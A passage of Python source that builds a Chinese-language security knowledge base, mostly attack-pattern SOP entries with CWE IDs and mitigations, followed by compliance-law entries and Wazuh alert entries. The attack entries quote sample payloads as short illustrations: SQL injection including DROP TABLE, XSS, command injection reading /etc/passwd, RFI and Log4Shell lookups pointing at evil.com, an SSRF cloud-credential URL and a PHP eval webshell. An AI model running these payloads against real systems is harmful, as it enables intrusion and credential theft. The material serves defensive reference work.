            "title": f"ATT&CK {tid} {name}",
            "signature": sig,
            "text": f"ATT&CK {tid} {name}。\n\n描述：{desc}\n\n处置建议：{mit}",
            "mitigation": mit,
        })
    return docs


def build_attack_pattern_docs() -> List[Dict[str, Any]]:
    """生成攻击模式与处置SOP文档。"""
    docs = []
    pattern_entries = [
        ("SQL注入-UNION查询", "CWE-89", "sqli-union", "攻击者使用UNION SELECT获取其他表数据。典型载荷：' UNION SELECT username,password FROM users--。数据库返回原查询结果和注入查询结果。", "1.参数化查询；2.WAF检测UNION SELECT模式；3.最小权限数据库账户；4.输入验证；5.关闭数据库错误显示。"),
        ("SQL注入-布尔盲注", "CWE-89", "sqli-blind-bool", "通过布尔条件判断逐字符提取数据。载荷：' AND 1=1-- / ' AND 1=2--，根据页面返回差异判断条件真假。", "1.参数化查询；2.WAF检测布尔注入；3.响应统一(时序恒定)；4.错误页面统一；5.输入验证。"),
        ("SQL注入-时间盲注", "CWE-89", "sqli-blind-time", "通过SLEEP/WAITFOR等函数的响应时间判断条件。载荷：'; WAITFOR DELAY '0:0:5'--。", "1.参数化查询；2.WAF检测时间函数；3.数据库权限限制；4.响应时间监控；5.输入验证。"),
        ("SQL注入-报错注入", "CWE-89", "sqli-error-based", "通过数据库错误信息获取数据。载荷：' AND extractvalue(1,concat(0x7e,(SELECT version())))--。", "1.参数化查询；2.关闭错误显示(display_errors=Off)；3.WAF规则；4.通用错误页面。"),
        ("SQL注入-堆叠查询", "CWE-89", "sqli-stacked", "使用分号执行多条SQL语句。载荷：'; DROP TABLE users;--。MySQL默认不支持，MSSQL/PostgreSQL支持。", "1.参数化查询；2.禁用多语句(multi_statements=0)；3.最小权限；4.WAF检测。"),
        ("SQL注入-二阶注入", "CWE-89", "sqli-second-order", "恶意数据先存储(注册/评论)，后续查询时触发注入。绕过输入验证。", "1.所有查询参数化；2.输入输出都验证；3.存储前净化；4.WAF。"),
        ("XSS-反射型", "CWE-79", "xss-reflected", "恶意脚本通过URL参数注入并反射给用户。载荷：<script>alert(document.cookie)</script>。", "1.输出HTML实体编码；2.CSP策略；3.HttpOnly Cookie；4.输入验证；5.XSS过滤库。"),
        ("XSS-存储型", "CWE-79", "xss-stored", "恶意脚本存储在数据库中(评论/个人资料)，其他用户访问时触发。危害最大。", "1.输出编码；2.CSP；3.富文本白名单过滤；4.输入验证；5.HttpOnly Cookie。"),
        ("XSS-DOM型", "CWE-79", "xss-dom", "通过修改DOM环境执行恶意脚本。载荷：#<img src=x onerror=alert(1)>。不经过服务器。", "1.安全的DOM操作(避免innerHTML)；2.CSP；3.输入验证；4.输出编码。"),
        ("XSS-突变型", "CWE-79", "xss-mutation", "通过浏览器HTML解析器的突变绕过过滤。上下文不同导致过滤失效。", "1.严格输出编码；2.CSP；3.多层防御；4.不依赖黑名单。"),
        ("命令注入-管道符", "CWE-78", "cmd-injection-pipe", "通过管道符|执行额外命令。载荷：127.0.0.1 | whoami。", "1.参数数组(subprocess.run(['cmd','arg']))；2.禁用shell=True；3.输入白名单；4.最小权限。"),
        ("命令注入-分号", "CWE-78", "cmd-injection-semicolon", "通过分号;执行额外命令(Unix)。载荷：; cat /etc/passwd。", "1.参数数组；2.输入验证；3.禁用shell；4.最小权限。"),
        ("命令注入-反引号", "CWE-78", "cmd-injection-backtick", "通过反引号`执行命令。载荷：`whoami`。", "1.参数数组；2.输入过滤；3.禁用shell；4.最小权限。"),
        ("命令注入-$()", "CWE-78", "cmd-injection-subshell", "通过$()执行命令。载荷：$(whoami)。", "1.参数数组；2.输入过滤；3.禁用shell；4.最小权限。"),
        ("命令注入-AND/OR", "CWE-78", "cmd-injection-andor", "通过&&或||执行命令。载荷：&& whoami / || whoami。", "1.参数数组；2.输入验证；3.禁用shell；4.最小权限。"),
        ("文件包含-本地(LFI)", "CWE-98", "lfi", "包含本地任意文件。载荷：?page=../../etc/passwd。可读取系统敏感文件。", "1.白名单文件名；2.路径规范化(realpath)并验证前缀；3.禁用动态包含；4.chroot。"),
        ("文件包含-远程(RFI)", "CWE-98", "rfi", "包含远程文件执行代码。载荷：?page=http://evil.com/shell.txt。需要allow_url_include=On。", "1.禁用allow_url_include；2.白名单文件；3.路径验证；4.禁用危险协议。"),
        ("文件包含-PHP协议", "CWE-98", "lfi-php-wrapper", "使用PHP协议绕过。载荷：?page=php://filter/convert.base64-encode/resource=index.php。", "1.禁用危险协议(php://)；2.白名单；3.路径验证；4.PHP版本升级。"),
        ("SSRF-基础", "CWE-918", "ssrf-basic", "服务器端请求伪造访问内部资源。载荷：?url=http://127.0.0.1/admin。", "1.URL白名单；2.禁用内网IP(127.0.0.1/10.0.0.0/8/172.16.0.0/12/192.168.0.0/16)；3.DNS解析后验证；4.禁用危险协议。"),
        ("SSRF-云元数据", "CWE-918", "ssrf-metadata", "访问云元数据获取凭据。载荷：?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/。", "1.禁用元数据IP(169.254.169.254)；2.IMDSv2(需要Token)；3.防火墙规则；4.最小权限。"),
        ("SSRF-DNS重绑定", "CWE-918", "ssrf-rebinding", "通过DNS重绑定绕过IP限制。域名解析IP在检查后变化。", "1.解析后验证IP；2.禁用内网IP；3.TTL=0检查；4.使用固定IP。"),
        ("XXE-基础", "CWE-611", "xxe-basic", "XML外部实体读取文件。载荷：<!ENTITY xxe SYSTEM \"file:///etc/passwd\">。", "1.禁用DTD(feature_disallow_doctype_decl)；2.禁用外部实体(external_general_entities=false)；3.安全解析器。"),
        ("XXE-Blind", "CWE-611", "xxe-blind", "无回显XXE通过OOB(Out-of-Band)外带数据。载荷使用外部DTD和HTTP请求。", "1.禁用DTD/实体；2.网络监控；3.防火墙限制出站；4.安全解析器。"),
        ("XXE-SSRF", "CWE-611", "xxe-ssrf", "通过XXE进行SSRF攻击。载荷：<!ENTITY xxe SYSTEM \"http://internal-service\">。", "1.禁用DTD；2.URL白名单；3.网络隔离；4.安全解析器。"),
        ("反序列化-Java", "CWE-502", "deser-java", "Java反序列化导致RCE。常见于Apache Commons Collections、Fastjson、Shiro。利用Gadget Chain。", "1.不反序列化用户数据；2.白名单类(look-ahead deserialization)；3.SerialKiller；4.升级组件；5.签名验证。"),
        ("反序列化-PHP", "CWE-502", "deser-php", "PHP反序列化导致代码执行。利用__wakeup/__destruct魔术方法构造POP链。工具：phpggc。", "1.不反序列化用户数据；2.使用JSON；3.签名验证；4.禁用phar协议；5.升级组件。"),
        ("反序列化-.NET", "CWE-502", "deser-dotnet", ".NET反序列化(BinaryFormatter/JavaScriptSerializer)导致RCE。工具：ysoserial.net。", "1.不使用BinaryFormatter；2.DataContractSerializer；3.类型白名单；4.升级框架。"),
        ("反序列化-Python", "CWE-502", "deser-python", "Python pickle反序列化导致RCE。pickle.loads执行__reduce__方法。", "1.不pickle用户数据；2.使用JSON替代；3.签名验证(HMAC)；4.白名单(find_class)。"),
        ("文件上传-无限制", "CWE-434", "upload-unrestricted", "允许上传任意文件类型导致WebShell。载荷：上传shell.php。", "1.白名单后缀(jpg/png/gif/pdf)；2.内容验证(magic number)；3.重命名文件；4.独立存储目录；5.禁用执行。"),
        ("文件上传-后缀绕过", "CWE-434", "upload-bypass-ext", "绕过后缀检查上传可执行文件。载荷：shell.phtml/shell.php5/shell.PHP/shell.php%00.jpg。", "1.严格白名单(小写)；2.内容检测；3.不信任Content-Type；4.重命名；5.禁用执行。"),
        ("文件上传-图片马", "CWE-434", "upload-image-shell", "图片中嵌入PHP代码。载荷：copy image.jpg/b + shell.php/a webshell.jpg。配合文件包含触发。", "1.内容检测；2.禁用执行；3.图片重生成(去掉附加数据)；4.文件包含修复。"),
        ("CSRF-基础", "CWE-352", "csrf-basic", "诱导已登录用户执行非自愿操作。载荷：<img src=http://bank.com/transfer?to=attacker&amount=10000>。", "1.CSRF令牌(同步令牌模式)；2.SameSite Cookie；3.验证Origin/Referer头；4.敏感操作二次确认。"),
        ("CSRF-JSON", "CWE-352", "csrf-json", "针对JSON接口的CSRF攻击。利用Flash或表单构造JSON请求。", "1.CSRF令牌；2.自定义请求头(X-Requested-With)；3.Content-Type验证；4.SameSite。"),
        ("逻辑漏洞-水平越权", "CWE-639", "authz-horizontal", "通过修改ID访问他人数据。载荷：?id=1 → ?id=2。", "1.对象级授权检查；2.服务端验证所属关系；3.默认拒绝；4.权限测试。"),
        ("逻辑漏洞-垂直越权", "CWE-269", "authz-vertical", "普通用户访问管理功能。载荷：直接访问/admin页面。", "1.角色检查；2.功能级授权；3.默认拒绝；4.菜单与服务端双重校验。"),
        ("逻辑漏洞-支付篡改", "CWE-840", "logic-payment", "修改支付金额或数量参数。载荷：amount=0.01。", "1.服务端价格校验；2.签名；3.不信任客户端参数；4.订单一致性校验。"),
        ("逻辑漏洞-验证码绕过", "CWE-804", "logic-captcha", "绕过验证码机制。返回包包含验证码/验证码不过期/客户端验证。", "1.服务端验证；2.一次性使用；3.图形复杂度；4.验证码与请求绑定。"),
        ("逻辑漏洞-密码重置", "CWE-640", "logic-reset", "绕过密码重置流程。修改重置链接参数/越权重置/Token可预测。", "1.安全令牌(随机)；2.一次性链接；3.验证用户身份；4.重置后通知。"),
        ("逻辑漏洞-并发", "CWE-362", "logic-race", "并发请求导致逻辑错误(多次领取/余额双花)。", "1.数据库锁(SELECT FOR UPDATE)；2.幂等设计；3.去重；4.分布式锁。"),
        ("信息泄露-目录遍历", "CWE-548", "info-dir-listing", "目录列表暴露敏感文件。Web服务器配置不当。", "1.关闭目录列表(AutoIndex Off)；2.默认页面(index.html)；3.权限控制。"),
        ("信息泄露-备份文件", "CWE-530", "info-backup", "备份文件(.bak/.sql/.zip/.tar.gz)可被访问。", "1.清理备份文件；2.不在Web目录；3.访问控制；4.定期扫描。"),
        ("信息泄露-Git泄露", "CWE-540", "info-git-leak", ".git目录暴露导致源码泄露。可还原完整源码。", "1.删除.git目录；2.配置禁止访问；3.权限控制；4.不在Web根目录部署。"),
        ("信息泄露-SVN泄露", "CWE-540", "info-svn-leak", ".svn目录暴露导致源码泄露。", "1.删除.svn目录；2.配置禁止访问；3.使用SVN导出而非检出到生产。"),
        ("信息泄露-DS_Store", "CWE-540", "info-dsstore", ".DS_Store文件泄露目录结构(macOS)。", "1.删除.DS_Store；2.配置禁止访问；3..gitignore。"),
        ("信息泄露-错误信息", "CWE-209", "info-error", "详细错误信息暴露技术栈。堆栈跟踪/SQL错误/路径。", "1.关闭debug模式；2.通用错误页面；3.日志记录细节；4.最小化响应。"),
        ("信息泄露-源码", "CWE-540", "info-source", "源码文件可直接下载。PHP未配置执行/配置文件可下载。", "1.PHP执行配置；2.代码分离；3.权限控制；4.配置文件后缀检查。"),
        ("信息泄露-phpinfo", "CWE-200", "info-phpinfo", "phpinfo()页面暴露配置信息(路径/扩展/环境变量)。", "1.删除phpinfo页面；2.访问控制；3.生产环境移除；4.配置限制。"),
        ("中间件-Tomcat反序列化", "CWE-502", "middleware-tomcat", "Tomcat反序列化漏洞(CVE-2017-12615 PUT方法/AJP漏洞CVE-2020-1938)。", "1.及时补丁；2.最小权限；3.WAF规则；4.禁用AJP或限制；5.关闭PUT方法。"),
        ("中间件-WebLogic反序列化", "CWE-502", "middleware-weblogic", "WebLogic反序列化漏洞(CVE-2017-10271/CVE-2020-14882)。", "1.及时补丁；2.最小权限；3.WAF；4.关闭不必要端口；5.访问控制。"),
        ("中间件-JBoss反序列化", "CWE-502", "middleware-jboss", "JBoss反序列化漏洞(CVE-2017-12149/invoker/JMXInvokerServlet)。", "1.及时补丁；2.最小权限；3.WAF；4.删除不必要组件；5.访问控制。"),
        ("中间件-Fastjson反序列化", "CWE-502", "middleware-fastjson", "Fastjson反序列化漏洞(autoType)。利用JNDI注入。", "1.升级到最新版本；2.autoType白名单；3.禁用autoType；4.WAF；5.替代为Gson/Jackson。"),
        ("中间件-Shiro反序列化", "CWE-502", "middleware-shiro", "Shiro rememberMe反序列化(CVE-2016-4437)。默认AES密钥可被破解。", "1.升级版本；2.更换默认密钥；3.WAF；4.禁用rememberMe；5.最小权限。"),
        ("中间件-Struts2 RCE", "CWE-94", "middleware-struts2", "Struts2 OGNL表达式注入(S2-045/S2-046/S2-052/S2-061)。", "1.升级版本；2.WAF规则；3.最小权限；4.移除不必要功能；5.监控。"),
        ("中间件-Log4j Log4Shell", "CWE-94", "middleware-log4j", "Log4j JNDI注入(CVE-2021-44228)。利用${jndi:ldap://evil.com/exp}触发RCE。", "1.升级Log4j到2.17+；2.禁用JNDI(log4j2.formatMsgNoLookups=true)；3.WAF；4.网络隔离；5.JDK限制JNDI。"),
        ("WebShell-一句话", "CWE-94", "webshell-oneliner", "PHP一句话木马：<?php @eval($_POST['cmd']);?>。配合中国菜刀/蚁剑连接。", "1.WAF检测(eval/base64_decode等关键字)；2.文件完整性监控；3.EDR；4.定期扫描(查杀工具)；5.禁用危险函数。"),
        ("WebShell-图片马", "CWE-94", "webshell-image", "图片中嵌入PHP代码。配合文件包含或重命名触发。", "1.内容检测；2.禁用执行；3.图片重生成；4.文件包含修复；5.WAF。"),
        ("WebShell-内存马", "CWE-94", "webshell-memory", "内存WebShell(Java Filter/Listener/Servlet型)，不留文件。", "1.内存扫描；2.进程监控；3.JVM监控；4.行为分析；5.重启服务。"),
        ("暴力破解-SSH", "CWE-307", "brute-ssh", "暴力破解SSH密码。常见于暴露22端口的Linux服务器。", "1.密钥认证(禁用密码登录)；2.Fail2ban(失败5次封禁)；3.修改默认端口；4.MFA；5.防火墙限制IP。"),
        ("暴力破解-RDP", "CWE-307", "brute-rdp", "暴力破解RDP密码。常见于暴露3389端口的Windows服务器。", "1.账户锁定(5次失败锁定)；2.MFA；3.网络限制(仅VPN访问)；4.监控；5.修改端口。"),
        ("暴力破解-FTP", "CWE-307", "brute-ftp", "暴力破解FTP密码。", "1.账户锁定；2.强密码；3.禁用匿名；4.监控；5.限制IP。"),
        ("暴力破解-Web登录", "CWE-307", "brute-web", "暴力破解Web登录(管理后台/OA)。", "1.验证码(滑动/图形)；2.账户锁定；3.限流；4.MFA；5.异常登录检测。"),
        ("权限提升-suid", "CWE-269", "priv-esc-suid", "利用SUID位程序提权。查找SUID程序：find / -perm -4000 2>/dev/null。常见：nmap/vim/find/bash。", "1.审计SUID程序；2.移除不必要SUID；3.最小权限；4.监控SUID执行；5.使用GTFOBins识别可利用程序。"),
        ("权限提升-sudo", "CWE-269", "priv-esc-sudo", "利用sudo配置不当提权。sudo -l查看可执行命令。常见：(ALL) NOPASSWD: ALL。", "1.sudo审计；2.最小权限；3.避免NOPASSWD；4.命令限制(完整路径)；5.sudo日志。"),
        ("权限提升-内核漏洞", "CWE-269", "priv-esc-kernel", "利用内核漏洞提权。典型：Dirty COW(CVE-2016-5195)、Dirty Pipe(CVE-2022-0847)。", "1.内核补丁；2.最小权限；3.监控exploit执行；4.漏洞管理；5.容器隔离。"),
        ("权限提升-cron", "CWE-269", "priv-esc-cron", "利用cron任务提权。通配符注入(tar --checkpoint)/脚本可写/路径可写。", "1.cron权限审计；2.最小权限；3.脚本权限；4.避免通配符；5.监控。"),
        ("权限提升-MySQL UDF", "CWE-269", "priv-esc-mysql-udf", "MySQL UDF提权。利用lib_mysqludf_sys执行系统命令。", "1.最小权限；2.禁用FILE权限；3.secure_file_priv；4.监控；5.版本升级。"),
        ("内网-ARP欺骗", "CWE-300", "mitm-arp", "ARP欺骗进行中间人攻击。攻击者伪造ARP响应，劫持流量。", "1.ARP绑定(静态ARP)；2.动态ARP检测(DAI)；3.端口安全；4.网络分段；5.加密通信(TLS)。"),
        ("内网-DNS欺骗", "CWE-300", "mitm-dns", "DNS欺骗重定向流量到恶意服务器。", "1.DNSSEC；2.DNS over HTTPS/TLS；3.本地DNS缓存保护；4.网络监控；5.加密通信。"),
        ("内网-LLMNR/NBT-NS投毒", "CWE-300", "mitm-llmnr", "LLMNR/NBT-NS投毒攻击。Responder工具捕获NTLMv2哈希。", "1.禁用LLMNR/NBT-NS；2.组策略配置；3.网络分段；4.监控；5.凭据保护。"),
        ("内网-Pass-the-Hash", "CWE-522", "lateral-pth", "Pass-the-Hash攻击。使用NTLM哈希直接认证，无需明文密码。", "1.禁用NTLM(仅Kerberos)；2.最小权限；3.凭据保护(Credential Guard)；4.EDR监控；5.网络分段。"),
        ("内网-Pass-the-Ticket", "CWE-522", "lateral-ptt", "Pass-the-Ticket攻击。使用Kerberos票据(黄金/白银票据)认证。", "1.Kerberos加固(AES加密)；2.定期更改krbtgt密码；3.最小权限；4.监控异常票据；5.EDR。"),
        ("内网-NTLM Relay", "CWE-300", "lateral-ntlm-relay", "NTLM中继攻击。将NTLM认证中继到其他服务。", "1.启用SMB签名；2.禁用NTLM；3.EPA(扩展保护认证)；4.网络分段；5.监控。"),
        ("内网-Kerberoasting", "CWE-522", "lateral-kerberoasting", "Kerberoasting攻击。请求服务票据(TGS)并离线破解。", "1.强服务账户密码(25+字符)；2.gMSA(组托管服务账户)；3.监控TGS请求；4.定期更换密码。"),
        ("内网-AS-REP Roasting", "CWE-522", "lateral-asrep-roasting", "AS-REP Roasting攻击。针对禁用预认证的账户，获取AS-REP并离线破解。", "1.启用预认证(Do not require Kerberos preauthentication)；2.强密码；3.监控；4.最小权限。"),
        ("内网-黄金票据", "CWE-522", "lateral-golden-ticket", "黄金票据攻击。使用krbtgt账户哈希伪造任意用户的TGT。需要域管权限。", "1.保护krbtgt账户；2.定期更改krbtgt密码(两次，间隔10小时)；3.ADCS；4.监控；5.最小权限。"),
        ("内网-白银票据", "CWE-522", "lateral-silver-ticket", "白银票据攻击。使用服务账户哈希伪造TGS，直接访问服务。", "1.保护服务账户；2.gMSA；3.强密码；4.监控异常TGS使用；5.PSP(特权访问工作站)。"),
        ("内网-DCShadow", "CWE-269", "lateral-dcshadow", "DCShadow攻击。将攻击者机器注册为域控制器，修改AD数据。需要域管权限。", "1.域控监控；2.异常DC注册检测；3.最小权限；4.网络分段；5.审计。"),
        ("内网-NTDS.dit提取", "CWE-522", "lateral-ntds-dump", "从域控制器提取NTDS.dit数据库，获取所有域用户哈希。方法：卷影复制/ntdsutil/Invoke-NinjaCopy。", "1.DC保护；2.EDR监控；3.最小权限；4.卷影副本监控；5.凭据保护。"),
        ("勒索软件-WannaCry", "CWE-119", "ransomware-wannacry", "WannaCry勒索软件利用 EternalBlue(CVE-2017-0144) SMB漏洞传播。加密文件并勒索比特币。", "1.SMB漏洞补丁(MS17-010)；2.禁用SMBv1；3.离线备份；4.EDR；5.网络分段；6.最小权限。"),
        ("勒索软件-LockBit", "CWE-269", "ransomware-lockbit", "LockBit勒索软件。RaaS(勒索即服务)模式，通过RDP/VPN/钓鱼入侵，加密前先窃取数据(双重勒索)。", "1.备份；2.MFA；3.EDR；4.网络分段；5.最小权限；6.漏洞管理；7.员工培训。"),
        ("挖矿木马", "CWE-269", "miner-malware", "挖矿木马利用系统资源进行加密货币挖矿。通过漏洞/弱密码入侵。", "1.EDR；2.CPU监控；3.网络监控(矿池连接)；4.漏洞补丁；5.最小权限；6.弱密码修复。"),
        ("僵尸网络-Mirai", "CWE-798", "botnet-mirai", "Mirai僵尸网络利用IoT设备弱密码(Telnet)入侵，发起DDoS攻击。", "1.强密码；2.禁用Telnet；3.固件升级；4.网络隔离；5.监控。"),
        ("APT-鱼叉钓鱼", "CWE-79", "apt-spearphishing", "APT组织使用定制鱼叉钓鱼攻击特定目标，附件含0day漏洞利用或定制恶意软件。", "1.邮件安全网关(沙箱)；2.EDR；3.员工培训；4.威胁情报；5.最小权限；6.网络分段。"),
        ("APT-水坑攻击", "CWE-79", "apt-watering-hole", "APT组织攻击目标常访问的网站，植入恶意代码，等待目标访问。", "1.浏览器隔离；2.威胁情报；3.EDR；4.网站完整性监控；5.网络分段。"),
        ("APT-供应链攻击", "CWE-502", "apt-supply-chain", "APT组织通过供应链(软件更新/开源依赖)攻击目标。典型：SolarWinds、CCleaner。", "1.供应商安全评估；2.SBOM；3.代码签名验证；4.依赖审查；5.网络监控；6.最小权限。"),
        ("0day漏洞利用", "CWE-119", "apt-0day", "APT组织使用未公开漏洞(0day)进行攻击。常见于浏览器/Office/Windows。", "1.纵深防御；2.EDR；3.威胁情报；4.补丁管理；5.最小权限；6.网络分段。"),
        ("WebShell-检测", "CWE-94", "webshell-detect", "WebShell检测。基于特征(eval/system/assert/base64_decode)/行为(异常文件创建)/流量(特征请求)。", "1.WAF规则；2.文件完整性监控；3.EDR；4.定期扫描(D盾/河马)；5.日志分析；6.最小权限。"),
    ]

    for i, (title, cwe, sig, desc, mit) in enumerate(pattern_entries):
        docs.append({
            "id": f"AP-{i:04d}",
            "source": "Attack-Pattern-SOP",
            "cwe": cwe,
            "title": title,
            "signature": sig,
            "text": f"{title}。\n\n关联CWE：{cwe}\n\n描述：{desc}\n\n处置SOP：{mit}",
            "mitigation": mit,
        })
    return docs


def build_regulatory_docs() -> List[Dict[str, Any]]:
    """生成法规合规知识文档。"""
    docs = []
    regulatory_entries = [
        ("等保2.0-安全物理环境", "等保2.0", "dengbao-physical", "等保2.0三级要求：机房场地应选择具有防震、防风、防雨能力的建筑；机房出入口应配置电子门禁系统，控制、鉴别和记录进入的人员。", "1.机房物理安全检查；2.门禁系统部署与审计；3.环境监控(温湿度/漏水/烟雾)；4.视频监控；5.防雷接地。"),
        ("等保2.0-安全通信网络", "等保2.0", "dengbao-network", "等保2.0三级要求：应保证通信传输过程中的完整性；应采用密码技术保证通信过程中数据的完整性；应划分不同的网络区域。", "1.网络分段；2.VPN加密传输；3.网络设备加固；4.边界防护(防火墙/IPS)；5.通信完整性校验。"),
        ("等保2.0-安全区域边界", "等保2.0", "dengbao-boundary", "等保2.0三级要求：应在网络边界根据访问控制策略设置访问控制规则；应能检测到对网络设备网络攻击并告警。", "1.防火墙访问控制；2.IDS/IPS；3.DDoS防护；4.恶意代码检测；5.安全审计。"),
        ("等保2.0-安全计算环境", "等保2.0", "dengbao-computing", "等保2.0三级要求：应对登录的用户进行身份标识和鉴别；应启用安全审计功能；应采用密码技术防止数据被窃取。", "1.身份认证(MFA)；2.访问控制；3.安全审计；4.数据加密(传输/存储)；5.入侵防范；6.恶意代码防范。"),
        ("等保2.0-安全管理中心", "等保2.0", "dengbao-mgmt-center", "等保2.0三级要求：应对网络中发生的各类安全事件进行识别报警和分析；应对安全策略、恶意代码、补丁升级集中管理。", "1.SOC/SIEM建设；2.集中安全管理平台；3.安全事件响应；4.策略集中管理；5.统一告警。"),
        ("等保2.0-安全管理制度", "等保2.0", "dengbao-policy", "等保2.0要求：应制定信息安全工作的总体方针和安全策略；应对管理人员或操作人员执行的日常管理操作建立操作规程。", "1.安全管理制度建设；2.操作规程；3.安全策略文档；4.定期评审；5.制度培训。"),
        ("PIPL-个人信息处理", "个人信息保护法", "pipl-processing", "《个人信息保护法》要求：处理个人信息应当遵循合法、正当、必要原则；应当取得个人同意；应当明示处理目的、方式和范围。", "1.最小必要原则；2.明确告知与同意；3.目的限制；4.公开透明；5.质量保证；6.安全保障。"),
        ("PIPL-敏感个人信息", "个人信息保护法", "pipl-sensitive", "《个人信息保护法》要求：处理敏感个人信息应当取得单独同意；处理不满14周岁未成年人个人信息应当取得监护人同意。敏感信息包括生物识别、宗教信仰、特定身份、医疗健康、金融账户、行踪轨迹。", "1.单独同意机制；2.未成年人保护；3.严格访问控制；4.加密存储；5.审计日志；6.影响评估。"),
        ("PIPL-数据出境", "个人信息保护法", "pipl-cross-border", "《个人信息保护法》要求：向境外提供个人信息应当通过安全评估、经专业机构认证、或与境外接收方订立合同。", "1.数据出境安全评估；2.专业机构认证；3.标准合同；4.影响评估；5.个人单独同意；6.监管申报。"),
        ("数据安全法-数据分类分级", "数据安全法", "dsl-classification", "《数据安全法》要求：国家建立数据分类分级保护制度；根据数据在经济社会发展中的重要程度以及一旦遭到篡改、破坏、泄露或者非法获取、非法利用，对国家安全、公共利益或者个人、组织合法权益造成的危害程度，对数据实行分类分级保护。", "1.数据分类分级制度；2.重要数据识别；3.分级保护措施；4.定期评估；5.目录管理。"),
        ("数据安全法-重要数据保护", "数据安全法", "dsl-important-data", "《数据安全法》要求：重要数据处理者应当明确数据安全负责人和管理机构；应当定期开展风险评估。", "1.数据安全负责人；2.安全管理机构；3.风险评估；4.应急预案；5.事件报告；6.年度评估。"),
        ("网络安全法-网络运营者义务", "网络安全法", "cybersec-law-operator", "《网络安全法》要求：网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全；应当采取数据分类、重要数据备份和加密等措施。", "1.安全保护义务；2.数据分类；3.重要数据备份与加密；4.安全事件报告；5.个人信息保护；6.合规审计。"),
        ("网络安全法-关键信息基础设施", "网络安全法", "cybersec-law-cii", "《网络安全法》要求：关键信息基础设施运营者在网络安全等级保护制度的基础上，履行更严格的保护义务。", "1.等保2.0三级以上；2.关键岗位人员安全审查；3.容灾备份；4.应急预案；5.年度评估；6.采购安全审查。"),
        ("GDPR-数据主体权利", "GDPR", "gdpr-rights", "GDPR赋予数据主体多项权利：知情权、访问权、更正权、删除权(被遗忘权)、限制处理权、数据可携带权、反对权、自动化决策相关权利。", "1.隐私政策透明；2.数据主体请求响应机制；3.数据删除流程；4.数据导出功能；5.处理限制机制；6.人工干预。"),
        ("GDPR-合法处理依据", "GDPR", "gdpr-lawful-basis", "GDPR要求处理个人数据必须有合法依据：同意、合同履行、法律义务、生命利益、公共利益、合法利益。", "1.合法依据评估；2.同意管理；3.合同条款；4.合法利益评估(LIA)；5.记录处理活动。"),
        ("GDPR-数据泄露通知", "GDPR", "gdpr-breach-notification", "GDPR要求：数据泄露发生后72小时内通知监管机构；若高风险则通知数据主体。", "1.泄露检测机制；2.72小时通知流程；3.风险评估；4.数据主体通知；5.记录保存；6.应急预案。"),
        ("ISO27001-信息安全管理体系", "ISO27001", "iso27001-isms", "ISO27001要求建立信息安全管理体系(ISMS)，包括风险评估、风险处置、适用性声明、持续改进。", "1.ISMS建设；2.风险评估；3.风险处置计划；4.适用性声明；5.内部审核；6.管理评审；7.持续改进。"),
        ("ISO27001-访问控制", "ISO27001", "iso27001-access", "ISO27001 A.9访问控制要求：访问控制策略、用户访问管理、用户责任、网络访问控制、操作系统访问控制、应用访问控制、移动计算和远程工作。", "1.访问控制策略；2.用户生命周期管理；3.最小权限；4.MFA；5.网络分段；6.审计日志。"),
        ("ISO27001-密码学", "ISO27001", "iso27001-crypto", "ISO27001 A.10密码学要求：使用密码控制策略、密钥管理、信息保护(加密)。", "1.密码控制策略；2.加密标准(AES-256)；3.密钥管理(KMS)；4.密钥轮换；5.安全协议(TLS 1.2+)。"),
        ("ISO27001-运营安全", "ISO27001", "iso27001-ops", "ISO27001 A.12运营安全要求：操作程序和职责、恶意代码防范、备份、日志监控、漏洞管理、网络管理。", "1.操作规程；2.防病毒；3.备份策略；4.日志监控(SIEM)；5.漏洞管理；6.网络监控。"),
        ("PCI-DSS-持卡人数据保护", "PCI-DSS", "pci-dss-card-data", "PCI-DSS要求保护持卡人数据：构建和维护安全网络、保护持卡人数据、维护漏洞管理程序、实施强访问控制、监控测试网络、维护信息安全策略。", "1.防火墙配置；2.默认密码修改；3.持卡人数据加密；4.加密传输；5.防病毒；6.最小权限；7.访问控制；8.日志监控；9.漏洞扫描；10.渗透测试。"),
        ("PCI-DSS-加密要求", "PCI-DSS", "pci-dss-encryption", "PCI-DSS要求：在开放公共网络传输持卡人数据时加密；使用强密码学(如AES-128)加密存储。", "1.TLS 1.2+传输；2.AES-128+存储加密；3.密钥管理；4.证书管理；5.加密强度评估。"),
        ("网络安全审查办法", "网安审查办法", "cybersec-review", "《网络安全审查办法》要求：关键信息基础设施运营者采购网络产品和服务，应当通过网络安全审查；数据处理者开展数据处理活动，影响或可能影响国家安全的，应当进行网络安全审查。", "1.采购安全审查；2.供应链风险管理；3.数据处理审查；4.国家安全影响评估；5.申报流程。"),
        ("关基保护条例", "关基条例", "cii-protection", "《关键信息基础设施安全保护条例》要求：建立健全网络安全保护制度和责任制；设置专门安全管理机构；定期进行网络安全教育、技术培训和技能考核。", "1.安全责任制；2.安全管理机构；3.人员培训；4.网络安全监测；5.应急预案；6.年度评估；7.采购审查。"),
    ]

    for title, source, sig, desc, mit in regulatory_entries:
        docs.append({
            "id": f"REG-{sig}",
            "source": source,
            "cwe": "",
            "title": title,
            "signature": sig,
            "text": f"{title}。\n\n来源：{source}\n\n要求：{desc}\n\n合规建议：{mit}",
            "mitigation": mit,
        })
    return docs


def build_vendor_alert_docs() -> List[Dict[str, Any]]:
    """生成厂商告警知识文档(Wazuh规则/常见告警)。"""
    docs = []
    vendor_alerts = [
        # Wazuh规则相关
        ("Wazuh-SSH暴力破解", "Wazuh", "wazuh-ssh-brute", "Wazuh规则检测到SSH暴力破解行为。规则ID: 5710/5712/5715/5716。多次SSH认证失败，可能为暴力破解攻击。", "1.检查源IP是否为已知恶意IP；2.确认目标账户是否为有效账户；3.临时封禁源IP(Fail2ban)；4.检查是否有成功登录(5715规则)；5.审查SSH配置(禁用密码登录)；6.强化密码策略；7.启用MFA。"),
        ("Wazuh-SSH成功登录", "Wazuh", "wazuh-ssh-success", "Wazuh规则检测到SSH成功登录。规则ID: 5715。需确认是否为合法登录。", "1.验证登录用户是否合法；2.检查登录时间是否为工作时间；3.检查源IP是否为已知IP；4.检查登录后执行命令；5.若异常则禁用账户并调查。"),
        ("Wazuh-sudo提权", "Wazuh", "wazuh-sudo", "Wazuh规则检测到sudo命令执行。规则ID: 5402。需确认是否为合法操作。", "1.验证执行sudo的用户；2.检查执行的命令是否合法；3.确认是否在变更窗口；4.审查sudo权限配置；5.若异常则禁用账户并调查。"),
